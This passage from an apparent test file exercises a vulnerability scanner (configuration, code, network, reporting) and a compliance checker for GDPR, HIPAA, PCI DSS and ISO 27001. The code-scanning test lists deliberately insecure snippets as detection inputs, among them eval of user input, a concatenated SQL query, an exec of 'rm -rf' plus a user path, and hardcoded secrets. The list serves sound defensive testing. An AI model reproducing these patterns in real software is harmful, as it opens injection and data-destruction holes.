    assert_true(vulnerability.cve_id.length() > 0)
    assert_true(vulnerability.severity >= 1 && vulnerability.severity <= 10)
    assert_true(vulnerability.description.length() > 0)
  }
  
  // Test configuration vulnerability scanning
  let configuration_items = [
    ConfigurationItem::new("ssl_version", "TLSv1.0"),
    ConfigurationItem::new("password_policy", "min_length_6"),
    ConfigurationItem::new("session_timeout", "3600"),
    ConfigurationItem::new("encryption_algorithm", "DES"),
    ConfigurationItem::new("debug_mode", "enabled")
  ]
  
  let configuration_vulnerabilities = VulnerabilityScanner::scan_configuration(
    vulnerability_scanner, 
    configuration_items
  )
  
  // Verify configuration vulnerabilities are detected
  assert_true(configuration_vulnerabilities.length() > 0)
  
  for vulnerability in configuration_vulnerabilities {
    assert_true(vulnerability.configuration_item.length() > 0)
    assert_true(vulnerability.current_value.length() > 0)
    assert_true(vulnerability.recommended_value.length() > 0)
    assert_true(vulnerability.severity >= 1 && vulnerability.severity <= 10)
    assert_true(vulnerability.description.length() > 0)
  }
  
  // Test code vulnerability scanning
  let code_snippets = [
    "eval(user_input)", // Code injection
    "query = \"SELECT * FROM users WHERE id = \" + user_id", // SQL injection
    "exec(\"rm -rf \" + user_path)", // Command injection
    "password = \"plaintext_password\"", // Hardcoded password
    "token = \"static_secret_token\"" // Hardcoded token
  ]
  
  let code_vulnerabilities = VulnerabilityScanner::scan_code(
    vulnerability_scanner, 
    code_snippets
  )
  
  // Verify code vulnerabilities are detected
  assert_true(code_vulnerabilities.length() > 0)
  
  for vulnerability in code_vulnerabilities {
    assert_true(vulnerability.file_path.length() > 0)
    assert_true(vulnerability.line_number > 0)
    assert_true(vulnerability.vulnerability_type.length() > 0)
    assert_true(vulnerability.severity >= 1 && vulnerability.severity <= 10)
    assert_true(vulnerability.description.length() > 0)
  }
  
  // Test network vulnerability scanning
  let network_endpoints = [
    NetworkEndpoint::new("api.azimuth.telemetry", 443, "https"),
    NetworkEndpoint::new("db.azimuth.telemetry", 5432, "postgresql"),
    NetworkEndpoint::new("cache.azimuth.telemetry", 6379, "redis"),
    NetworkEndpoint::new("internal.azimuth.telemetry", 8080, "http")
  ]
  
  let network_vulnerabilities = VulnerabilityScanner::scan_network(
    vulnerability_scanner, 
    network_endpoints
  )
  
  // Verify network vulnerabilities are detected
  assert_true(network_vulnerabilities.length() >= 0)
  
  for vulnerability in network_vulnerabilities {
    assert_true(vulnerability.endpoint.length() > 0)
    assert_true(vulnerability.port > 0)
    assert_true(vulnerability.protocol.length() > 0)
    assert_true(vulnerability.vulnerability_type.length() > 0)
    assert_true(vulnerability.severity >= 1 && vulnerability.severity <= 10)
    assert_true(vulnerability.description.length() > 0)
  }
  
  // Test vulnerability report generation
  let report_result = VulnerabilityScanner::generate_report(vulnerability_scanner)
  match report_result {
    Some(report) => {
      assert_true(report.summary.total_vulnerabilities > 0)
      assert_true(report.summary.critical_vulnerabilities >= 0)
      assert_true(report.summary.high_vulnerabilities >= 0)
      assert_true(report.summary.medium_vulnerabilities >= 0)
      assert_true(report.summary.low_vulnerabilities >= 0)
      assert_true(report.scan_date.length() > 0)
      assert_true(report.scan_duration_seconds > 0)
    }
    None => assert_true(false)
  }
  
  // Test vulnerability remediation suggestions
  for vulnerability in dependency_vulnerabilities {
    let remediation = VulnerabilityScanner::get_remediation_suggestion(
      vulnerability_scanner, 
      vulnerability
    )
    match remediation {
      Some(suggestion) => {
        assert_true(suggestion.description.length() > 0)
        assert_true(suggestion.steps.length() > 0)
        assert_true(suggestion.priority >= 1 && suggestion.priority <= 5)
      }
      None => assert_true(false)
    }
  }
}

// Test 10: Security Compliance
test "security compliance" {
  let compliance_checker = ComplianceChecker::new()
  
  // Test GDPR compliance
  let gdpr_requirements = [
    GDPRRequirement::DataMinimization,
    GDPRRequirement::PurposeLimitation,
    GDPRRequirement::DataAccuracy,
    GDPRRequirement::StorageLimitation,
    GDPRRequirement::SecurityMeasures,
    GDPRRequirement::DataSubjectRights,
    GDPRRequirement::DataProtectionOfficer,
    GDPRRequirement::DataProtectionImpactAssessment,
    GDPRRequirement::BreachNotification,
    GDPRRequirement::InternationalDataTransfers
  ]
  
  let gdpr_compliance_result = ComplianceChecker::check_gdpr_compliance(
    compliance_checker, 
    gdpr_requirements
  )
  
  assert_true(gdpr_compliance_result.overall_score >= 0 && gdpr_compliance_result.overall_score <= 100)
  assert_eq(gdpr_compliance_result.requirements_checked, gdpr_requirements.length())
  
  for requirement_result in gdpr_compliance_result.requirement_results {
    assert_true(requirement_result.compliant == true || requirement_result.compliant == false)
    assert_true(requirement_result.score >= 0 && requirement_result.score <= 10)
    assert_true(requirement_result.observations.length() > 0)
  }
  
  // Test HIPAA compliance
  let hipaa_requirements = [
    HIPAARequirement::AdministrativeSafeguards,
    HIPAARequirement::PhysicalSafeguards,
    HIPAARequirement::TechnicalSafeguards,
    HIPAARequirement::OrganizationalRequirements,
    HIPAARequirement::PoliciesAndProcedures,
    HIPAARequirement::BreachNotification,
    HIPAARequirement::PrivacyPolicies,
    HIPAARequirement::BusinessAssociateAgreements
  ]
  
  let hipaa_compliance_result = ComplianceChecker::check_hipaa_compliance(
    compliance_checker, 
    hipaa_requirements
  )
  
  assert_true(hipaa_compliance_result.overall_score >= 0 && hipaa_compliance_result.overall_score <= 100)
  assert_eq(hipaa_compliance_result.requirements_checked, hipaa_requirements.length())
  
  for requirement_result in hipaa_compliance_result.requirement_results {
    assert_true(requirement_result.compliant == true || requirement_result.compliant == false)
    assert_true(requirement_result.score >= 0 && requirement_result.score <= 10)
    assert_true(requirement_result.observations.length() > 0)
  }
  
  // Test PCI DSS compliance
  let pci_dss_requirements = [
    PCIDSSRequirement::NetworkSecurity,
    PCIDSSRequirement::DataProtection,
    PCIDSSRequirement::VulnerabilityManagement,
    PCIDSSRequirement::AccessControl,
    PCIDSSRequirement::MonitoringTesting,
    PCIDSSRequirement::InformationSecurityPolicy
  ]
  
  let pci_dss_compliance_result = ComplianceChecker::check_pci_dss_compliance(
    compliance_checker, 
    pci_dss_requirements
  )
  
  assert_true(pci_dss_compliance_result.overall_score >= 0 && pci_dss_compliance_result.overall_score <= 100)
  assert_eq(pci_dss_compliance_result.requirements_checked, pci_dss_requirements.length())
  
  for requirement_result in pci_dss_compliance_result.requirement_results {
    assert_true(requirement_result.compliant == true || requirement_result.compliant == false)
    assert_true(requirement_result.score >= 0 && requirement_result.score <= 10)
    assert_true(requirement_result.observations.length() > 0)
  }
  
  // Test ISO 27001 compliance
  let iso27001_requirements = [
    ISO27001Requirement::InformationSecurityPolicies,
    ISO27001Requirement::OrganizationOfInformationSecurity,
    ISO27001Requirement::HumanResourceSecurity,
    ISO27001Requirement::AssetManagement,
    ISO27001Requirement::AccessControl,
    ISO27001Requirement::Cryptography,
    ISO27001Requirement::PhysicalAndEnvironmentalSecurity,
    ISO27001Requirement::OperationsSecurity,
    ISO27001Requirement::CommunicationsSecurity,
    ISO27001Requirement::SystemAcquisitionDevelopmentMaintenance,
    ISO27001Requirement::SupplierRelationships,
    ISO27001Requirement::InformationSecurityIncidentManagement,
    ISO27001Requirement::InformationSecurityAspectsOfBusinessContinuityManagement,
    ISO27001Requirement::Compliance
  ]
  
  let iso27001_compliance_result = ComplianceChecker::check_iso27001_compliance(
    compliance_checker, 
    iso27001_requirements
  )
  
  assert_true(iso27001_compliance_result.overall_score >= 0 && iso27001_compliance_result.overall_score <= 100)
  assert_eq(iso27001_compliance_result.requirements_checked, iso27001_requirements.length())
  
  for requirement_result in iso27001_compliance_result.requirement_results {
    assert_true(requirement_result.compliant == true || requirement_result.compliant == false)
    assert_true(requirement_result.score >= 0 && requirement_result.score <= 10)
    assert_true(requirement_result.observations.length() > 0)
  }
  
  // Test compliance report generation
  let compliance_report = ComplianceChecker::generate_compliance_report(compliance_checker)
  
  assert_true(compliance_report.gdpr_score >= 0 && compliance_report.gdpr_score <= 100)
  assert_true(compliance_report.hipaa_score >= 0 && compliance_report.hipaa_score <= 100)
  assert_true(compliance_report.pci_dss_score >= 0 && compliance_report.pci_dss_score <= 100)
  assert_true(compliance_report.iso27001_score >= 0 && compliance_report.iso27001_score <= 100)
  assert_true(compliance_report.overall_compliance_score >= 0 && compliance_report.overall_compliance_score <= 100)
  assert_true(compliance_report.recommendations.length() > 0)
  assert_true(compliance_report.next_review_date.length() > 0)
  
  // Test compliance improvement suggestions
  let improvement_suggestions = ComplianceChecker::get_improvement_suggestions(compliance_checker)
  assert_true(improvement_suggestions.length() > 0)
  
  for suggestion in improvement_suggestions {
    assert_true(suggestion.framework.length() > 0)
    assert_true(suggestion.requirement.length() > 0)
    assert_true(suggestion.description.length() > 0)
    assert_true(suggestion.priority >= 1 && suggestion.priority <= 5)
    assert_true(suggestion.estimated_effort_days >= 0)
  }
}